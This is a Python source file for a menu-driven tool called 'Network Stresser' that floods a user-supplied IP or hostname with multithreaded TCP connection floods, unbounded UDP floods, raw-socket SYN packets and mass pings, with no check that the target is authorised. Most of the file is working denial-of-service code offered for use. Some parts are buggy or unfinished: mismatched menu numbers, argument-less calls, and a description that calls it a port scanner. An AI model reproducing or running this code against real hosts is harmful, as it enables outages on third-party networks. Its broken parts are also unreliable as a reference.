# This script will be a network stress testing tool. 
# The tool will provide the user the ability to choose a target by either IP or Hostname ("example.com")
# The tool should be a menu based system, but with custom commands that can be typed instead of using numerical menu system.


#=====================#
# Linking to project. #
#=====================#

tool_details = {
    "name":"Stress Tester",
    "filename":"network_stresser.py",
    "Category":"Network", 
    "Version":"1.0",
    "Description":"This will scan a target to check if ports are open."
}


#=========#
# Imports #
#=========#

from internal_library.asset_functions import beautify, beautify_string, beautify_title,resolve_hostname, get_os, clear_screen as clear_screen, menu_option, sanitize_target_input
import socket
import os
import threading
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import subprocess
import time
import struct
import select
import random


#==================#
# Global Variables #
#==================#
target = ""
target_ip = ""
target_hostname = ""
target_port = 80
attack = ""

# Global Varaibles for Tracking
packets_sent = 0
packets_received = 0
packets_lost = 0

#==================#
# Attack Functions #
#==================#


#|> Ping Attack <|#
def ping_target(target_ip):
    """Function to ping the target IP once and record the outcome."""
    global packets_sent, packets_received, packets_lost
    
    packets_sent += 1

    # Check the operating system and set the correct ping command
    if get_os() == "Windows":
        # For Windows, the count flag is -n
        response = subprocess.run(["ping", "-n", "1", target_ip], capture_output=True, text=True)
    else:
        # For Unix-like systems (Linux, macOS), the count flag is -c
        response = subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True)
        
    if response.returncode == 0:
        packets_received += 1
    else:
        packets_lost += 1

def ping_attack(target_ip, number_of_pings=4):
    """Conduct a pinging attack using concurrent futures for parallel execution."""
    global packets_sent, packets_received, packets_lost
    
    # Reset packet tracking
    packets_sent = 0
    packets_received = 0
    packets_lost = 0
    
    print(f"Pinging {target_ip} with 32 bytes of data:")
    
    # Use ThreadPoolExecutor to ping in parallel
    with ThreadPoolExecutor(max_workers=number_of_pings) as executor:
        futures = [executor.submit(ping_target, target_ip) for _ in range(number_of_pings)]
        # Wait for all futures to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                # Results are not used directly as the global counters are updated by each function call
                future.result()
            except Exception as exc:
                print(f"Generated an exception: {exc}")
    
    # Print the summary of the attack
    print(f"Packets: Sent = {packets_sent}, Received = {packets_received}, Lost = {packets_lost}")


#======================#
#|> TCP Flood Attack <|#
#======================#

def tcp_flood(target_ip, target_port,  message="Hello"):
    """Function to send TCP packets to the target IP and port."""
    global packets_sent
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            # Connect to server and send data
            sock.connect((target_ip, target_port))
            sock.sendall(bytes(message, "utf-8"))
            packets_sent += 1
    except Exception as e:
        # Print the error message | Should add graceful exit here. <!!> | It is common for errors to occur in network attacks or if firewalls are in place.
        print(f"Error: {e}")

def tcp_flood_attack(target_ip, target_port, number_of_packets=0, message="Hello"):
    """Conduct a TCP flood attack continuously until stopped manually."""
    global packets_sent
    
    print(f"Continuously TCP Flooding {target_ip}:{target_port} with custom message... Press CTRL+C to stop.")

    # Reset packet tracking
    packets_sent = 0
    if number_of_packets == 0:
        # Infinite loop
        try:
            while True:
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
                    futures = [executor.submit(tcp_flood, target_ip, target_port, message) for _ in range(1)]
                    # Wait for all futures to complete
                    for future in concurrent.futures.as_completed(futures):
                        pass
                # If threading or concurrent execution is desired, it could be added here
                #tcp_flood(target_ip, target_port)
                # Optional: Print the number of packets sent every N packets for feedback without overwhelming the console
                #if packets_sent % 100 == 0:
                #   print(f"Packets Sent: {packets_sent}")

                # A small delay can be added to avoid overwhelming the network, comment out if unnecessary
                # time.sleep(0.01)
        except KeyboardInterrupt:
            # When the user stops the attack manually
            print(f"\nAttack stopped. Total Packets Sent: {packets_sent}")
    else:
        try:
            # Use ThreadPoolExecutor to send packets in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=number_of_packets) as executor:
                futures = [executor.submit(tcp_flood, target_ip, target_port) for _ in range(number_of_packets)]
                # Wait for all futures to complete
                for future in concurrent.futures.as_completed(futures):
                    pass
        except KeyboardInterrupt:
            # When the user stops the attack manually
            print(f"\nAttack stopped. Total Packets Sent: {packets_sent}")
            
    # Print the summary of the attack
    print(f"Packets Sent: {packets_sent}")
    
#==================#
# SYN Flood Attack #
#==================#

def syn_flood_attack(target_ip, target_port): # Because of restrictions on project scope, this feature is not yet implemented as it requires packet manipulation.
    try:
        print("SYN Flooding " + target_ip + " on port " + str(target_port) + "...")
        while True:
            syn_flood(target_ip, target_port)
    except KeyboardInterrupt:
        print("Stopping SYN Flood attack...")

#======================#
#|> UDP Flood Attack <|#
#======================#
def udp_flood(target_ip, target_port, message="Hello", number_of_packets=0):
    """Function to send UDP packets to the target IP and port."""
    global packets_sent
    print(f"Initiating UDP Flood Attack on {target_ip}:{target_port}... Press CTRL+C to stop.")

    # Reset packet tracking
    packets_sent = 0

    # Define the stop condition for the infinite loop
    stop_attack = False
    while stop_attack == False:
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
                futures = []
                for _ in range(number_of_packets or 1):  # Ensure at least one packet is sent if number_of_packets is 0
                    if stop_attack:
                        break
                    futures.append(executor.submit(send_udp_packet, target_ip, target_port, message))

                # If number_of_packets is 0, run indefinitely
                while number_of_packets == 0 and not stop_attack:
                    futures.append(executor.submit(send_udp_packet, target_ip, target_port, message))

                # Wait for all futures to complete if a specific number of packets is set
                if number_of_packets:
                    concurrent.futures.wait(futures)

        except KeyboardInterrupt:
            stop_attack = True
            print(f"\nAttack stopped by user. Total Packets Sent: {packets_sent}")

def send_udp_packet(target_ip, target_port, message):
    """Helper function to send a single UDP packet."""
    global packets_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(message, "utf-8"), (target_ip, target_port))
        packets_sent += 1
    except Exception as e:
        print(f"Error sending UDP packet: {e}")
    finally:
        sock.close()
        
#=======================================#
# TCP Packet Construction for SYN Flood #
#=======================================#

def checksum(data):
    """
    Calculates the TCP checksum for given data, ensuring data integrity over the network.

    The checksum is a critical part of the TCP/IP protocols, used to detect data corruption during transmission.
    This function implements the checksum calculation by dividing the data into 16-bit words,
    summing them together, and performing a bit-wise NOT operation on the result.

    Parameters:
    - data (bytes): The header and data for which the checksum is to be calculated.

    Returns:
    - The calculated checksum as an integer.
    """
    # Ensure the data is even-numbered in length by padding with a null byte if necessary.
    if len(data) % 2 != 0:
        data += b'\0'
        
    # Sum the 16-bit words in the data
    s = sum(array := struct.unpack('!'+str(len(data)//2)+'H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    
    # Add carry, if any, by shifting the right 16 bits and adding to the sum.
    # Then, perform a bit wise NOT operation to get the checksum.
    s = ~s & 0xffff
    return s

def create_tcp_header(source_port, dest_port, checksum):
    """
    Manually constructs a TCP header with the specified parameters.

    Parameters:
    - source_port (int): The source port number.
    - dest_port (int): The destination port number.
    - checksum (int): The pre-calculated checksum for the header and data.

    The TCP header includes fields like sequence numbers and flags. Here, we're particularly setting the SYN flag to initiate a connection.

    The struct module is used to pack the header fields into a byte string, following the network byte order (!),
    which is Big-Endian. This is crucial for ensuring that the packet is correctly interpreted by network devices.

    Returns:
    - A byte string representing the TCP header.
    """
    # TCP header are packed using the struct module to ensure correct byte order.
    # This includes the source port, destination port, sequence number, acknowledgment number, and data offset,
    # flags (with SYN flag set), window size, checksum, and urgent pointer.
    seq = 0
    ack_seq = 0
    doff = 5
    syn_flag = 2
    window = socket.htons(5840)
    urg_ptr = 0
    offset_res = (doff << 4) + 0
    tcp_flags = syn_flag
    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, checksum, urg_ptr)
    return tcp_header

def get_source_ip(target_ip):
    """ Get the source IP address of the machine """
    try:
        # Temporary socket to determine the source IP
        temp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        temp_sock.connect((target_ip, 80))  # 80 is arbitrary, no data is sent
        source_ip = temp_sock.getsockname()[0]
        temp_sock.close()
        return source_ip
    except Exception as e:
        print(f"Could not determine source IP: {e}")
        return None

def send_syn_packet(target_ip, target_port):
    # Sends a single SYN packet to the target IP and port
    try:
        source_ip = get_source_ip(target_ip)
        if not source_ip:
            print("Source IP could not be determined. Aborting SYN packet send.")
            return
    
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) # Create a raw socket to send the SYN packet

        placeholder_tcp_header = create_tcp_header(source_port=12345, dest_port=target_port, checksum=0)
        pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(target_ip), 0, socket.IPPROTO_TCP, len(placeholder_tcp_header)) # Create the pseudo header for checksum calculation
        psh = pseudo_header + placeholder_tcp_header # Combine the pseudo header and TCP header
        tcp_checksum = checksum(psh) # Calculate the checksum for the pseudo header and TCP header.
        tcp_header = create_tcp_header(source_port=12345, dest_port=target_port, checksum=tcp_checksum) # Create the TCP header with the correct checksum
        s.sendto(tcp_header, (target_ip, target_port)) # Send the SYN packet to the target IP and port
        
        
        ready = select.select([s], [], [], 5) # Wait for <x> seconds for a response (x=5)
        if ready[0]:
            data, addr = s.recvfrom(1024)
            tcp_header_len = (data[32] >> 4) * 4
            tcp_header = data[20:20+tcp_header_len]
            if len(tcp_header) > 13:
                flags = tcp_header[13]
                if flags & 0x12:  # SYN-ACK
                    print(f"Port {target_port} is open (SYN-ACK received).")
                elif flags & 0x04:  # RST
                    print(f"Port {target_port} is closed (RST received).")
        else:
            print(f"No response received for port {target_port}, it might be filtered or the scan timed out.")
    except PermissionError:
        print("Permission denied. Please run the script as a superuser (root).")
        exit()
    except Exception as e:
        print(f"Error sending SYN packet: {e}")
    except KeyboardInterrupt:
        print("SYN packet send stopped by user.")
        return
    
#=======================================#
# TCP Packet Construction for SYN Flood #
#=======================================#


def syn_flood(target_ip, target_port, number_of_packets=0):
    """
    Conducts a SYN flood attack on the target IP and port by sending multiple SYN packets.

    The attack involves sending a high volume of SYN packets to overwhelm the target system,
    causing it to consume resources and potentially become unresponsive.

    Parameters:
    - target_ip (str): The IP address of the target system.
    - target_port (int): The port number on the target system.
    - number_of_packets (int): The number of SYN packets to send. If 0, the attack runs indefinitely.
    """
    global packets_sent
    print(f"Initiating SYN Flood Attack on {target_ip}:{target_port}... Press CTRL+C to stop.")

    # Reset packet tracking
    packets_sent = 0
    
    # Define the stop condition for the infinite loop
    stop_attack = False
    while stop_attack == False:
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
                futures = []
                for _ in range(number_of_packets or 1):  # Ensure at least one packet is sent if number_of_packets is 0
                    if stop_attack:
                        break
                    futures.append(executor.submit(send_syn_packet, target_ip, target_port))

                # If number_of_packets is 0, run indefinitely
                while number_of_packets == 0 and not stop_attack:
                    futures.append(executor.submit(send_syn_packet, target_ip, target_port))

                # Wait for all futures to complete if a specific number of packets is set
                if number_of_packets:
                    concurrent.futures.wait(futures)
        except PermissionError:
            print("Permission denied. Please run the script as a superuser (root).")
            stop_attack = True
        except KeyboardInterrupt:
            stop_attack = True
            print(f"\nAttack stopped by user. Total Packets Sent: {packets_sent}")
        

#======================#
#|> Slowloris Attack <|#
#======================#
    
def slowloris_attack():
    global target_ip
    print("Slowloris attacking " + target_ip + " on port " + str(target_port) + "...")
    print("This feature is not yet implemented.")
    
    
def stop_attack(): # This function is not yet implemented.
    global attack
    attack = ""
    print("Stopping attack...")


#===================#
# Testing Functions #
#===================#

def is_target_valid():
    get_target = input("Enter the IP or Hostname of the target: \n>> ")
    target_ip = sanitize_target_input(get_target)
    print(f"Target: {target_ip}")
    return target_ip


#=================#
# Option Function #
#=================#
def menu_stresser_options():
    # Options
    tcp_floot_option = menu_option(1, "TCP Flood Attack (Currently testing, varied performance based on network and OS)")
    syn_flood_option = menu_option(2, "SYN Flood Attack (Superuser/root REQUIRED)")
    udp_flood_option = menu_option(3, "UDP Flood Attack")
    slowloris_option = menu_option(5, "Slowloris Attack (Not yet implemented)")
    ICMP_option = menu_option(6, "ICMP Attack (Testing Phase)")
    
    options = f"{tcp_floot_option}{syn_flood_option}{udp_flood_option}{slowloris_option}{ICMP_option}"
    return options
    
#=================#
#  Main Function  #
#=================#
def main():
    packets = 1000
    clear_screen()
    
    stresser_menu_title = beautify_title("Network Stresser", "=", 5)
    options = menu_stresser_options()

    print(f"""{stresser_menu_title}
Welcome to the Network Stresser.
This tool will allow you to stress test a network by conducting various attacks on a target.
          
          """)
    print(f"{options}")
    attack_choice = input(">> ")
    
    if attack_choice == "1": # TCP Flood Attack |MENU OPTION|
        target_ip = is_target_valid()
        
        # Ask for the port number
        target_port = input("Enter the port number: \n>> ")
        if target_port == "":
            target_port = 80
        else:
            target_port = int(target_port)
        
        tcp_flood_attack(target_ip, target_port)
        

        
        
    elif attack_choice == "2": # SYN Flood Attack
        target_ip = is_target_valid()
        syn_flood_attack()
    elif attack_choice == "3": # UDP Flood Attack
        target_ip = is_target_valid()
        udp_flood(target_ip, 80, "Hello", packets) # NEEDS TO BE TESTED
    elif attack_choice == "4": # Slowloris Attack
        target_ip = is_target_valid()
        slowloris_attack()
    elif attack_choice == "5": # ICMP Attack
        target_ip = is_target_valid()
        ping_attack(target_ip, 10000)
    
    # Shortcut commands for attacks.
    elif "tcp:" in attack_choice: # TCP Flood Attack |COMMAND| Default port is 80 and packets is 0. | Command: tcp:<ip> |
        attack_choice = attack_choice.split(":")
        target_ip = attack_choice[1]
        tcp_flood_attack(target_ip, 80)
    elif "syn:" in attack_choice: # SYN Flood Attack |COMMAND| Default port is 80 and packets is 0. | Command: syn:<ip> |
        attack_choice = attack_choice.split(":")
        target_ip = attack_choice[1]
        target_port = attack_choice[2]
        syn_flood_attack(target_ip, 80)
    
    elif "exit" in attack_choice:
        print("Exiting Network Stresser...")
        exit()
    else:
        print("Invalid option. Please try again.")
        input("Press Enter to Continue...")
    
    
    
    #target_ip = is_target_valid()
    #tcp_flood_attack(target_ip, 80)

if __name__ == "__main__":
    while True:
        clear_screen()
        main()